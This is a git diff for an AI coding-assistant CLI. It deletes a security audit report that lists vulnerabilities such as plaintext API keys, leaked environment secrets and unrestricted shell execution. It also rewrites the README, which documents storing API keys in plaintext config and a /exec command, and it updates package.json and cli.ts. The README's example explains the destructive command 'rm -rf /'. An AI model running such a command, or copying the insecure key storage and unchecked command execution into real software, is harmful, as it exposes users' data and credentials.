-3. HARDCODED PLAINTEXT API KEYS (CWE-798)
-   Files: warp-cli/src/services/config.service.ts
-          warp-cli/src/cli.ts:319-337
-          warp-cli/.env.example
-   Issue: API keys stored unencrypted in config files
-   Risk: File access = credential compromise
-   Fix: Use OS keychain (macOS Keychain, Windows Credential Manager, Linux Secret Service)
-        Never store secrets in config files
-
-
-HIGH SEVERITY VULNERABILITIES (Fix Soon)
-=========================================
-
-4. ENVIRONMENT SECRETS LEAK TO DATABASE (CWE-532)
-   File: warp-cli/src/services/session.service.ts:128
-   Issue: Full process.env saved to SQLite database
-   Risk: Database compromise = all API keys exposed
-   Fix: Filter environment - allowlist only safe variables
-
-5. MCP CHILD PROCESS INJECTION (CWE-94)
-   File: tabby-ai-agent/src/services/mcp-client.service.ts:238-303
-   Issue: Child processes spawned with unsanitized env vars and output
-   Risk: Malicious MCP servers can capture API keys
-   Fix: Sanitize env vars, validate args, use process isolation
-
-6. UNSAFE JSON DESERIALIZATION (CWE-502)
-   Files: Multiple locations (context.service.ts, session.storage.ts, config.service.ts)
-   Issue: JSON.parse() without schema validation
-   Risk: App crash, data corruption, prototype pollution
-   Fix: Use zod/joi for schema validation
-
-7. MCP TOOL NAME INJECTION (CWE-89)
-   File: tabby-ai-agent/src/services/ai-agent.service.ts:401-434
-   Issue: Tool names extracted from AI response without validation
-   Risk: Arbitrary tool execution
-   Fix: Validate tool names against whitelist before execution
-
-8. SECRETS IN ERROR MESSAGES (CWE-209)
-   Multiple locations
-   Issue: Error messages include API keys and endpoints
-   Risk: Logs expose credentials
-   Fix: Sanitize errors, use error codes instead of details
-
-
-MEDIUM SEVERITY ISSUES
-======================
-
-9. FTS SEARCH INJECTION (CWE-89)
-   File: warp-cli/src/storage/session.storage.ts:229
-   Issue: FTS MATCH operators not escaped
-   Fix: Escape special FTS characters in search input
-
-10. NO COMMAND WHITELIST (CWE-78)
-    File: warp-cli/src/commands/handlers.ts:283-289
-    Issue: /exec allows any command
-    Fix: Implement command whitelist (git, npm, etc only)
-
-11. SESSION AUTOSAVE RACE CONDITION (CWE-362)
-    File: warp-cli/src/services/session.service.ts:132-143
-    Issue: No locks on concurrent session saves
-    Fix: Implement mutex/queue for save operations
-
-12. POTENTIAL XSS (CWE-79)
-    File: tabby-ai-agent/src/plugin.ts, ai-agent.service.ts
-    Issue: Not all output sanitized for HTML rendering
-    Fix: Always sanitize user-facing output
-
-13. .env NOT IN GITIGNORE (CWE-540)
-    File: .gitignore
-    Issue: Secrets could be committed
-    Fix: Add .env and .env.local to .gitignore
-        Add pre-commit hook to prevent secret commits
-
-14. UNENCRYPTED HTTP (CWE-295)
-    File: warp-cli/src/providers/ollama.provider.ts:10
-    Issue: Default Ollama endpoint is HTTP (localhost:11434)
-    Risk: Prompts/responses sent in cleartext
-    Fix: Use HTTPS by default, warn on unencrypted
-
-15. ENV VARS PASSED TO SUBPROCESSES (CWE-532)
-    File: tabby-ai-agent/src/services/mcp-client.service.ts:232-235
-    Issue: Full process.env inherited by child processes
-    Fix: Create clean environment with only needed vars
-
-
-LOW SEVERITY ISSUES
-===================
-
-16. VERBOSE ERROR MESSAGES
-    Issue: Stack traces expose internals
-    Fix: Use error codes, log details separately
-
-17. WEAK MCP COMMAND VALIDATION
-    File: tabby-ai-agent/src/services/mcp-client.service.ts:706-712
-    Issue: Only checks command name, not full path/args
-    Fix: Use absolute paths, validate all args, sandbox processes
-
-18. NO SESSION EXPIRATION
-    File: warp-cli/src/services/session.service.ts
-    Issue: Sessions kept forever
-    Fix: Implement 90-day TTL, auto-cleanup
-
-19. DATABASE PERMISSIONS
-    File: warp-cli/src/storage/session.storage.ts:11
-    Issue: Default dir permissions, no encryption
-    Fix: Create with 0o700 perms, encrypt database
-
-20. NO RATE LIMITING
-    All providers
-    Issue: API calls not rate limited
-    Fix: Add rate limiting per provider
-
-
-QUICK ACTION ITEMS
-==================
-
-URGENT (Today):
-[ ] Disable /exec command or whitelist only safe commands
-[ ] Fix Gemini API key URL exposure (move to header)
-[ ] Start using OS keychain for API keys
-[ ] Filter process.env before storing in sessions
-
-THIS WEEK:
-[ ] Add input validation on all commands
-[ ] Implement JSON schema validation
-[ ] Sanitize error messages
-[ ] Add tool execution validation
-[ ] Fix .gitignore
-[ ] Add pre-commit hooks
-
-NEXT 2 WEEKS:
-[ ] Implement encryption for config/session data
-[ ] Add rate limiting
-[ ] Implement session expiration
-[ ] Add comprehensive audit logging
-[ ] Upgrade old dependencies
-
-DEPENDENCY ISSUES
-=================
-- node-fetch@2.7.0 - Consider upgrading to 3.x
-- conf@10.2.0 - Not suitable for secrets storage
-- sqlite3@5.1.7 - Check for CVEs
-- Run: npm audit regularly
-
-ARCHITECTURE ISSUES
-===================
-- No authentication layer
-- No secrets management system
-- No encryption at rest
-- No API key rotation mechanism
-- No rate limiting
-- No session management security
-
-NEXT STEPS
-==========
-1. Review this report with security team
-2. Prioritize critical fixes
-3. Create GitHub issues for each vulnerability
-4. Implement fixes in order of severity
-5. Add security tests to prevent regressions
-6. Conduct follow-up security review after fixes
-
-For detailed analysis, see SECURITY_ANALYSIS.md
diff --git a/warp-cli/README.md b/warp-cli/README.md
index b4aeec4..33afde1 100644
--- a/warp-cli/README.md
+++ b/warp-cli/README.md
@@ -1,88 +1,534 @@
-# Warp CLI
+# Warp CLI - AI Coding Assistant
 
-Warp CLI is a standalone command-line interface (CLI) tool designed to interact with various large language models (LLMs) such as OpenAI, Anthropic, Gemini, and Ollama. It provides a seamless way to integrate AI capabilities into your terminal workflows, with a focus on security, extensibility, and ease of use.
+A powerful, standalone CLI-based coding agent similar to Warp.dev with support for multiple LLM providers (local and cloud), persistent memory, context retrieval, and session management.
+
+![Version](https://img.shields.io/badge/version-1.0.0-blue)
+![License](https://img.shields.io/badge/license-MIT-green)
 
 ## Features
 
-- **Multi-Provider Support**: Interact with OpenAI, Anthropic, Gemini, and Ollama LLMs.
-- **Secure API Key Management**: API keys are securely stored using `keytar`.
-- **Rate Limiting**: Prevent API overuse with `bottleneck`-based rate limiting.
-- **Config Validation**: Ensure robust configurations with `zod` validation.
-- **Structured Error Handling**: Comprehensive error management for better debugging.
-- **Session Management**: Persistent sessions for context-aware interactions.
+### ü§ñ Multi-LLM Support
+- **Ollama** - Run models locally (Llama, Mistral, etc.)
+- **OpenAI** - GPT-4, GPT-3.5, and other models
+- **Anthropic** - Claude 3.5 Sonnet and other Claude models
+- **Google Gemini** - Gemini 1.5 Flash and Pro
+
+### üíæ Persistent Sessions
+- Save and load conversation sessions
+- Full-text search across sessions
+- Export sessions as JSON or Markdown
+- Auto-save functionality
+
+### üß† Smart Context Awareness
+- Automatic Git repository detection
+- Project type recognition (Node.js, Python, Rust, Go, etc.)
+- Command history tracking
+- Terminal output monitoring
+
+### üé® Beautiful Terminal UI
+- Warp-inspired interface
+- Syntax highlighting
+- Markdown rendering
+- Streaming responses
+- Color-coded messages
+
+### ‚ö° Powerful Commands
+- Execute shell commands
+- Git integration
+- Command explanation
+- Error debugging
+- Code suggestions
 
 ## Installation
 
-1. Clone the repository:
+### From NPM (Coming Soon)
+```bash
+npm install -g warp-cli
+```
+
+### From Source
+```bash
+# Clone the repository
+git clone https://github.com/harryneopotter/aicli.git
+cd aicli/warp-cli
+
+# Install dependencies
+npm install
+
+# Build the project
+npm run build
+
+# Install globally
+npm link
+```
+
+## Quick Start
+
+### 1. Run Setup
+```bash
+warp setup
+```
+
+This will guide you through:
+- Choosing your LLM provider
+- Configuring API keys (if needed)
+- Setting preferences
+
+### 2. Start Chatting
+```bash
+warp
+```
+
+Or use the explicit chat command:
+```bash
+warp chat
+```
+
+### 3. Basic Usage
+```
+üí¨ chat > What is the command to list files?
+
+ü§ñ ASSISTANT
+The `ls` command lists files and directories. Here are common variations:
+
+- `ls` - List files in current directory
+- `ls -la` - List all files including hidden, with details
+- `ls -lh` - List with human-readable sizes
+
+üí¨ chat > /exec ls -la
+```
+
+## Configuration
+
+### Interactive Setup
+```bash
+warp setup
+```
+
+### Manual Configuration
+```bash
+# View current configuration
+warp config --list
+
+# Set a value
+warp config --set defaultProvider=ollama
+
+# Get a specific value
+warp config --get providers.ollama
+```
+
+### Configuration File
+Configuration is stored in `~/.config/warp-cli/config.json`
+
+Example configuration:
+```json
+{
+  "defaultProvider": "ollama",
+  "providers": {
+    "ollama": {
+      "endpoint": "http://localhost:11434",
+      "model": "llama3.2"
+    },
+    "openai": {
+      "apiKey": "sk-...",
+      "model": "gpt-4-turbo-preview"
+    },
+    "anthropic": {
+      "apiKey": "sk-ant-...",
+      "model": "claude-3-5-sonnet-20241022"
+    },
+    "gemini": {
+      "apiKey": "...",
+      "model": "gemini-1.5-flash"
+    }
+  },
+  "ui": {
+    "theme": "dark",
+    "markdown": true,
+    "streaming": true
+  },
+  "context": {
+    "maxHistory": 50,
+    "includeGit": true,
+    "includeFiles": true,
+    "autoContext": true
+  },
+  "session": {
+    "autosave": true,
+    "directory": "~/.warp-cli/sessions"
+  }
+}
+```
+
+## Commands
+
+### Chat Commands
+
+| Command | Description |
+|---------|-------------|
+| `/help` | Show help message |
+| `/clear` | Clear screen |
+| `/exit`, `/quit` | Exit application |
+| `/new [name]` | Create new session |
+| `/save [name]` | Save current session |
+| `/load <id>` | Load a session |
+| `/list` | List all sessions |
+| `/delete <id>` | Delete a session |
+| `/search <query>` | Search sessions |
+
+### Configuration Commands
+
+| Command | Description |
+|---------|-------------|
+| `/config` | Show configuration |
+| `/provider <name>` | Switch LLM provider |
+| `/model <name>` | Set model name |
+| `/context` | Show current context |
+
+### Execution Commands
+
+| Command | Description |
+|---------|-------------|
+| `/exec <command>` | Execute shell command |
+| `/git <args>` | Execute git command |
+| `/explain <command>` | Explain a command |
+| `/suggest <task>` | Suggest command for task |
+
+### Utility Commands
+
+| Command | Description |
+|---------|-------------|
+| `/stats` | Show session statistics |
+| `/export <id> [format]` | Export session (json/markdown) |
+
+## CLI Commands
+
+### Chat
+```bash
+# Start with default provider
+warp chat
+
+# Start with specific provider
+warp chat --provider openai
+
+# Start with specific model
+warp chat --model gpt-4
+
+# Resume a session
+warp chat --session <id>
+```
+
+### Configuration Management
+```bash
+# List configuration
+warp config --list
+
+# Set a value
+warp config --set key=value
+
+# Get a value
+warp config --get key
+
+# Reset to defaults
+warp config --reset
+```
+
+### Session Management
+```bash
+# List all sessions
+warp sessions --list
+
+# Delete a session
+warp sessions --delete <id>
+
+# Export a session
+warp sessions --export <id> --format json
+```
+
+## Provider Setup
+
+### Ollama (Local)
+
+1. Install Ollama: https://ollama.ai
+2. Pull a model:
+   ```bash
+   ollama pull llama3.2
+   ```
+3. Configure Warp CLI:
    ```bash
-   git clone https://github.com/harryneopotter/aicli.git
-   cd warp-cli
+   warp setup
+   # Choose "Ollama (Local)"
+   # Set endpoint: http://localhost:11434
+   # Set model: llama3.2
    ```
 
-2. Install dependencies:
+### OpenAI
+
+1. Get API key from: https://platform.openai.com/api-keys
+2. Configure:
    ```bash
-   npm install
+   warp setup
+   # Choose "OpenAI"
+   # Enter your API key
+   # Choose model (e.g., gpt-4-turbo-preview)
    ```
 
-3. Build the project:
+### Anthropic (Claude)
+
+1. Get API key from: https://console.anthropic.com/
+2. Configure:
    ```bash
-   npm run build
+   warp setup
+   # Choose "Anthropic (Claude)"
+   # Enter your API key
+   # Choose model (e.g., claude-3-5-sonnet-20241022)
    ```
 
-4. Link the CLI globally (optional):
+### Google Gemini
+
+1. Get API key from: https://makersuite.google.com/app/apikey
+2. Configure:
    ```bash
-   npm link
+   warp setup
+   # Choose "Google Gemini"
+   # Enter your API key
+   # Choose model (e.g., gemini-1.5-flash)
    ```
 
-## Usage
+## Environment Variables
+
+You can also configure providers using environment variables:
 
-Run the CLI:
 ```bash
-warp-cli
-```
+# OpenAI
+export OPENAI_API_KEY=sk-...
 
-## Configuration
+# Anthropic
+export ANTHROPIC_API_KEY=sk-ant-...
+
+# Gemini
+export GEMINI_API_KEY=...
+```
 
-Configuration is managed via JSON files. Use the `config` command to set up API keys and other settings:
+Create a `.env` file in `~/.warp-cli/`:
 ```bash
-warp-cli config set --provider openai --api-key YOUR_API_KEY
+OPENAI_API_KEY=sk-...
+ANTHROPIC_API_KEY=sk-ant-...
+GEMINI_API_KEY=...
 ```
 
 ## Examples
 
-### Chat with OpenAI
+### Basic Conversation
+```
+üí¨ chat > How do I create a new Git branch?
+
+ü§ñ ASSISTANT
+To create a new Git branch, use:
+
+```bash
+git branch <branch-name>
+git checkout <branch-name>
+```
+
+Or use the shorthand:
+```bash
+git checkout -b <branch-name>
+```
+
+This creates and switches to the new branch in one command.
+```
+
+### Execute Commands
+```
+üí¨ chat > /exec git status
+
+üì¶ Command: git status
+
+On branch main
+Your branch is up to date with 'origin/main'.
+
+nothing to commit, working tree clean
+```
+
+### Explain Commands
+```
+üí¨ chat > /explain rm -rf /
+
+ü§ñ ASSISTANT
+‚ö†Ô∏è WARNING: This is a DANGEROUS command!
+
+`rm -rf /` will:
+1. Remove (`rm`) files recursively (`-r`)
+2. Force deletion without prompts (`-f`)
+3. Starting from root directory (`/`)
+
+This will DELETE YOUR ENTIRE SYSTEM!
+
+Never run this command! It's often used as an example of what NOT to do.
+```
+
+### Session Management
+```
+üí¨ chat > /save my-project-session
+‚úÖ Session saved: my-project-session (ID: a1b2c3d4)
+
+üí¨ chat > /list
+‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï§‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï§‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï§‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
+‚ïë ID       ‚îÇ Name              ‚îÇ Created          ‚îÇ Updated          ‚ïë
+‚ïü‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ï¢
+‚ïë a1b2c3d4 ‚îÇ my-project-session‚îÇ Jan 15, 2024 ... ‚îÇ Jan 15, 2024 ... ‚ïë
+‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïß‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïß‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïß‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
+```
+
+## Advanced Features
+
+### Context Awareness
+
+Warp CLI automatically detects and includes:
+- Current working directory
+- Git repository info (branch, status, remotes)
+- Project type (package.json, Cargo.toml, etc.)
+- Recent commands and outputs
+- System information (OS, shell)
+
+### Streaming Responses
+
+Enable streaming for real-time responses:
+```bash
+warp config --set ui.streaming=true
+```
+
+### Markdown Support
+
+Responses are rendered with full markdown support:
+- Code blocks with syntax highlighting
+- Lists and tables
+- Bold, italic, and other formatting
+
+## Troubleshooting
+
+### Ollama Connection Failed
+```bash
+# Check if Ollama is running
+ollama list
+
+# Start Ollama if needed
+ollama serve
+```
+
+### API Key Issues
+```bash
+# Verify your API key is set
+warp config --get providers.<provider>.apiKey
+
+# Re-run setup if needed
+warp setup
+```
+
+### Session Storage Issues
+```bash
+# Check session directory
+ls ~/.warp-cli/sessions/
+
+# Reset if corrupted
+rm ~/.warp-cli/sessions/sessions.db
+warp chat  # Will create new database
+```
+
+## Development
+
+### Build
+```bash
+npm run build
+```
+
+### Development Mode
+```bash
+npm run dev
+```
+
+### Watch Mode
 ```bash
-warp-cli chat --provider openai --message "Hello, AI!"
+npm run watch
 ```
 
-### List Available Models
+### Run Tests
 ```bash
-warp-cli models --provider gemini
+npm test
 ```
 
-## Security Improvements
+### Linting
+```bash
+npm run lint
+npm run lint:fix
+```
+
+## Architecture
 
-- **RCE Fixes**: Replaced vulnerable `exec` calls with `execFile`.
-- **Environment Filtering**: Prevented leakage of sensitive environment variables.
-- **Error Sanitization**: Ensured no sensitive data is exposed in error messages.
+```
+warp-cli/
+‚îú‚îÄ‚îÄ src/
+‚îÇ   ‚îú‚îÄ‚îÄ cli.ts              # Main CLI entry point
+‚îÇ   ‚îú‚îÄ‚îÄ types.ts            # TypeScript types
+‚îÇ   ‚îú‚îÄ‚îÄ commands/           # Command handlers
+‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ handlers.ts
+‚îÇ   ‚îú‚îÄ‚îÄ providers/          # LLM providers
+‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ base.provider.ts
+‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ ollama.provider.ts
+‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ openai.provider.ts
+‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ anthropic.provider.ts
+‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ gemini.provider.ts
+‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ index.ts
+‚îÇ   ‚îú‚îÄ‚îÄ services/           # Core services
+‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ chat.service.ts
+‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ config.service.ts
+‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ context.service.ts
+‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ session.service.ts
+‚îÇ   ‚îú‚îÄ‚îÄ storage/            # Data persistence
+‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ session.storage.ts
+‚îÇ   ‚îî‚îÄ‚îÄ ui/                 # Terminal UI
+‚îÇ       ‚îî‚îÄ‚îÄ renderer.ts
+‚îú‚îÄ‚îÄ package.json
+‚îú‚îÄ‚îÄ tsconfig.json
+‚îî‚îÄ‚îÄ README.md
+```
 
 ## Contributing
 
-1. Fork the repository.
-2. Create a new branch:
-   ```bash
-   git checkout -b feature-name
-   ```
-3. Commit your changes:
-   ```bash
-   git commit -m "Add new feature"
-   ```
-4. Push to the branch:
-   ```bash
-   git push origin feature-name
-   ```
-5. Open a pull request.
+Contributions are welcome! Please:
+
+1. Fork the repository
+2. Create a feature branch
+3. Make your changes
+4. Add tests if applicable
+5. Submit a pull request
 
 ## License
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
\ No newline at end of file
+MIT License - see LICENSE file for details
+
+## Support
+
+- GitHub Issues: https://github.com/harryneopotter/aicli/issues
+- Documentation: https://github.com/harryneopotter/aicli/wiki
+
+## Roadmap
+
+- [ ] Plugin system for extensions
+- [ ] File context loading
+- [ ] Code analysis tools
+- [ ] Multi-language support
+- [ ] Custom themes
+- [ ] Voice input support
+- [ ] Integration with popular IDEs
+
+## Acknowledgments
+
+- Inspired by Warp.dev terminal
+- Built with TypeScript and Node.js
+- Uses multiple LLM providers for flexibility
+
+---
+
+Made with ‚ù§Ô∏è by the AI CLI Team
diff --git a/warp-cli/package.json b/warp-cli/package.json
index d0ea6e4..286aa86 100644
--- a/warp-cli/package.json
+++ b/warp-cli/package.json
@@ -4,8 +4,8 @@
   "description": "A standalone CLI-based coding agent with support for local and cloud LLMs",
   "main": "dist/index.js",
   "bin": {
-    "warp": "./dist/cli.js",
-    "warp-cli": "./dist/cli.js"
+    "warp": "dist/cli.js",
+    "warp-cli": "dist/cli.js"
   },
   "keywords": [
     "cli",
@@ -27,44 +27,42 @@
     "lint": "eslint src/**/*.ts",
     "lint:fix": "eslint src/**/*.ts --fix",
     "install-global": "npm run build && npm link",
-    "clean": "rm -rf dist"
+    "clean": "rmdir /s dist 2>nul || rm -rf dist"
   },
   "dependencies": {
     "@anthropic-ai/sdk": "^0.27.0",
-    "bottleneck": "^2.19.5",
+    "better-sqlite3": "^10.1.0",
     "boxen": "^5.1.2",
     "chalk": "^4.1.2",
-    "cli-highlight": "^2.1.11",
     "cli-table3": "^0.6.3",
     "commander": "^11.1.0",
     "conf": "^10.2.0",
     "date-fns": "^2.30.0",
     "dotenv": "^16.0.3",
-    "gradient-string": "^3.0.0",
     "inquirer": "^8.2.5",
     "marked": "^4.3.0",
     "marked-terminal": "^5.2.0",
-    "node-fetch": "^2.6.7",
+    "node-fetch": "^2.7.0",
     "openai": "^4.20.1",
     "ora": "^5.4.1",
     "simple-git": "^3.28.0",
-    "sqlite3": "^5.1.7",
     "strip-ansi": "^6.0.1",
     "uuid": "^9.0.0"
   },
   "devDependencies": {
+    "@types/date-fns": "^2.6.0",
     "@types/inquirer": "^8.2.5",
-    "@types/jest": "^29.5.0",
+    "@types/jest": "^29.5.12",
     "@types/node": "^18.19.0",
     "@types/node-fetch": "^2.6.11",
-    "@types/uuid": "^9.0.0",
-    "@typescript-eslint/eslint-plugin": "^6.0.0",
-    "@typescript-eslint/parser": "^6.0.0",
+    "@types/uuid": "^9.0.8",
+    "@typescript-eslint/eslint-plugin": "^6.21.0",
+    "@typescript-eslint/parser": "^6.21.0",
     "eslint": "^8.57.0",
     "jest": "^29.7.0",
-    "ts-jest": "^29.4.0",
+    "ts-jest": "^29.1.2",
     "ts-node": "^10.9.1",
-    "typescript": "^5.0.0"
+    "typescript": "^5.6.3"
   },
   "engines": {
     "node": ">=16.0.0"
diff --git a/warp-cli/src/cli.ts b/warp-cli/src/cli.ts
index a9fa0e0..ce9a006 100644
--- a/warp-cli/src/cli.ts
+++ b/warp-cli/src/cli.ts
@@ -1,60 +1,77 @@
 #!/usr/bin/env node
 
-import { Command } from 'commander';
-import * as readline from 'readline';
-import { container } from './container';
-import * as dotenv from 'dotenv';
-import * as path from 'path';
-import * as os from 'os';
+import { Command } from "commander";
+import * as readline from "readline";
+import { uiRenderer } from "./ui/renderer";
+import { configService } from "./services/config.service";
+import { sessionService } from "./services/session.service";
+import { chatService } from "./services/chat.service";
+import { commandHandler } from "./commands/handlers";
+import * as dotenv from "dotenv";
+import * as path from "path";
+import * as os from "os";
+
+import { JsonValue, ProviderConfig, ProviderName } from "./types";
 
 // Load environment variables
 dotenv.config();
-dotenv.config({ path: path.join(os.homedir(), '.warp-cli', '.env') });
-
-const { uiRenderer, configService, sessionService, chatService, commandHandler, pluginService } = container;
+dotenv.config({ path: path.join(os.homedir(), ".warp-cli", ".env") });
 
 const program = new Command();
 
+interface CliOptions {
+  provider?: string;
+  model?: string;
+  session?: string;
+  reset?: boolean;
+  list?: boolean;
+  get?: string;
+  set?: string;
+  delete?: string;
+  export?: string;
+  format?: string;
+}
+
 program
-  .name('warp-cli')
-  .description('AI-powered coding assistant CLI with multi-LLM support')
-  .version('1.0.0');
+  .name("warp-cli")
+  .description("AI-powered coding assistant CLI with multi-LLM support")
+  .version("1.0.0");
 
 program
-  .command('chat')
-  .description('Start interactive chat session (default)')
-  .option('-p, --provider <provider>', 'LLM provider to use')
-  .option('-m, --model <model>', 'Model to use')
-  .option('-s, --session <id>', 'Resume existing session')
+  .command("chat")
+  .description("Start interactive chat session (default)")
+  .option("-p, --provider <provider>", "LLM provider to use")
+  .option("-m, --model <model>", "Model to use")
+  .option("-s, --session <id>", "Resume existing session")
   .action(async (options) => {
     await startChatSession(options);
   });
 
 program
-  .command('config')
-  .description('Manage configuration')
-  .option('-s, --set <key=value>', 'Set configuration value')
-  .option('-g, --get <key>', 'Get configuration value')
-  .option('-l, --list', 'List all configuration')
-  .option('-r, --reset', 'Reset to defaults')
+  .command("config")
+  .description("Manage configuration")
+  .option("-s, --set <key=value>", "Set configuration value")
+  .option("-g, --get <key>", "Get configuration value")
+  .option("-l, --list", "List all configuration")
+  .option("-r, --reset", "Reset to defaults")
   .action(async (options) => {
     await manageConfig(options);
   });
 
 program
-  .command('sessions')
-  .description('Manage sessions')
-  .option('-l, --list', 'List all sessions')
-  .option('-d, --delete <id>', 'Delete a session')
-  .option('-e, --export <id>', 'Export a session')
-  .option('-f, --format <format>', 'Export format (json|markdown)', 'json')
+  .command("sessions")
+  .description("Manage sessions")
+  .option("-l, --list", "List all sessions")
+  .option("-d, --delete <id>", "Delete a session")
+  .option("-e, --export <id>", "Export a session")
+  .option("-f, --format <format>", "Export format (json|markdown)", "json")
   .action(async (options) => {
     await manageSessions(options);
   });
 
 program
-  .command('setup')
-  .description('Interactive setup wizard')
+  .command("setup")
+  .description("Interactive setup wizard")
   .action(async () => {
     await runSetup();
   });
@@ -64,27 +81,62 @@ program.action(async () => {
   await startChatSession({});
 });
 
-async function startChatSession(options: any): Promise<void> {
+async function startChatSession(options: CliOptions): Promise<void> {
   try {
-    await pluginService.initialize();
+    // Prompt for provider/model if not specified
+    if (!options.provider || !options.model) {
+      const inquirer = await import("inquirer");
+      const providerAnswers = await inquirer.default.prompt([
+        {
+          type: "list",
+          name: "provider",
+          message: "Select LLM provider:",
+          choices: [
+            { name: "Ollama (Local)", value: "ollama" },
+            { name: "OpenAI", value: "openai" },
+            { name: "Anthropic (Claude)", value: "anthropic" },
+            { name: "Google Gemini", value: "gemini" },
+          ],
+          default: options.provider || "ollama",
+        },
+        {
+          type: "input",
+          name: "model",
+          message: "Enter model name:",
+          default: options.model || "llama3.2",
+        },
+      ]);
+
+      options.provider = providerAnswers.provider;
+      options.model = providerAnswers.model;
+    }
+
     // Initialize services
     await sessionService.initialize();
-    await chatService.initialize();
 
-    // Apply CLI options
-    if (options.provider) {
-      await chatService.switchProvider(options.provider);
-    }
+    const providerName = (options.provider ||
+      configService.get("defaultProvider")) as ProviderName;
 
+    // Set the model for the selected provider
     if (options.model) {
-      const provider = configService.get('defaultProvider');
-      const providerConfig = configService.getProviderConfig(provider);
-      if (providerConfig) {
-        (providerConfig as any).model = options.model;
-        configService.setProviderConfig(provider, providerConfig);
-      }
+      const providerConfig = configService.getProviderConfig(providerName) as
+        | Partial<ProviderConfig>
+        | undefined;
+
+      const newConfig: Partial<ProviderConfig> = providerConfig
+        ? { ...providerConfig }
+        : {};
+      newConfig.model = options.model;
+
+      configService.setProviderConfig(
+        providerName,
+        newConfig as ProviderConfig,
+      );
     }
 
+    // Initialize chat service with the selected provider
+    await chatService.switchProviderWithFallback(providerName);
+
     // Load or create session
     if (options.session) {
       await sessionService.loadSession(options.session);
@@ -101,7 +153,7 @@ async function startChatSession(options: any): Promise<void> {
       uiRenderer.renderSessionInfo({
         name: session.name,
         messageCount: session.messages.length,
-        created: session.created
+        created: session.created,
       });
     }
 
@@ -111,14 +163,16 @@ async function startChatSession(options: any): Promise<void> {
       uiRenderer.renderInfo(`Using ${status.provider} provider`);
     } else {
       uiRenderer.renderWarning(
-        `Provider ${status.provider} not available: ${status.error || 'Unknown error'}`
+        `Provider ${status.provider} not available: ${status.error || "Unknown error"}`,
       );
     }
 
     // Start REPL
     await startREPL();
-  } catch (error: any) {
-    uiRenderer.renderError(`Failed to start chat session: ${error.message}`);
+  } catch (error: unknown) {
+    uiRenderer.renderError(
+      `Failed to start chat session: ${(error as Error).message || String(error)}`,
+    );
     process.exit(1);
   }
 }
@@ -127,15 +181,15 @@ async function startREPL(): Promise<void> {
   const rl = readline.createInterface({
     input: process.stdin,
     output: process.stdout,
-    prompt: '',
-    terminal: true
+    prompt: "",
+    terminal: true,
   });
 
-  const streaming = configService.get('ui').streaming;
+  const streaming = configService.get("ui").streaming;
 
   // Handle Ctrl+C
-  rl.on('SIGINT', async () => {
-    uiRenderer.renderInfo('\nExiting...');
+  rl.on("SIGINT", async () => {
+    uiRenderer.renderInfo("\nExiting...");
     await sessionService.cleanup();
     process.exit(0);
   });
@@ -144,7 +198,7 @@ async function startREPL(): Promise<void> {
     const trimmed = input.trim();
 
     if (!trimmed) {
-      uiRenderer.renderPrompt('chat');
+      uiRenderer.renderPrompt("chat");
       return;
     }
 
@@ -158,41 +212,41 @@ async function startREPL(): Promise<void> {
       }
 
       // If not a command, treat as chat message
-      if (!trimmed.startsWith('/')) {
+      if (!trimmed.startsWith("/")) {
         await chatService.chat(trimmed, { streaming });
       }
-    } catch (error: any) {
-      uiRenderer.renderError(error.message);
+    } catch (error: unknown) {
+      uiRenderer.renderError((error as Error).message || String(error));
     }
 
-    uiRenderer.renderPrompt('chat');
+    uiRenderer.renderPrompt("chat");
   };
 
-  rl.on('line', async (input: string) => {
+  rl.on("line", async (input: string) => {
     await processInput(input);
   });
 
-  rl.on('close', async () => {
+  rl.on("close", async () => {
     await sessionService.cleanup();
     process.exit(0);
   });
 
   // Show initial prompt
-  uiRenderer.renderPrompt('chat');
+  uiRenderer.renderPrompt("chat");
 }
 
